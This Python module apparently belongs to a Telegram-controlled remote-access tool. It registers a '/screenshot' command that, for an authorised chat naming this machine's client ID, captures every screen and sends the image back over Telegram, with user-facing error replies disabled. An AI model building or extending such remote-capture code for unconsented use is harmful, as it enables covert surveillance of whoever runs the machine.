from io import BytesIO

from PIL import ImageGrab

from telegram.ext import CommandHandler
from telegram.constants import ParseMode

passedCtx = None

def run(ctx):
    global passedCtx
    passedCtx = ctx
    ctx["app"].add_handler(CommandHandler("screenshot", screenshot))

async def screenshot(update, context):
    print(f"[screenshot] Received command from chat_id: {update.effective_chat.id}, username: {update.message.from_user.username}")

    if not passedCtx["auth"].CheckAuth(update.effective_chat.id):
        print(f"Unauthorized access attempt by {update.message.from_user.username}")
        #await update.message.reply_text("⛔ Unauthorized.")
        return

    if not context.args:
        #await update.message.reply_text("Usage: /screenshot <client_id>")
        print("No client ID provided")
        return
    
    if context.args[0] != passedCtx["info"].ReturnClientID():
        #await update.message.reply_text("❌ Invalid client ID.")
        print("Not the same client ID")
        return

    try:
        ss = ImageGrab.grab(all_screens=True)
        buffer = BytesIO()
        buffer.name = "screencap.png"
        ss.save(buffer, format="PNG")

        buffer.seek(0)
        #screenshot.save("screenshot.png")

        #with open("screenshot.png", "rb") as f:
        await update.message.reply_photo(photo=buffer, caption="📸 Screenshot captured.")
    except Exception as e:
        print(f"Error capturing screenshot: {e}")
        #await update.message.reply_text("❌ Failed to capture screenshot.")
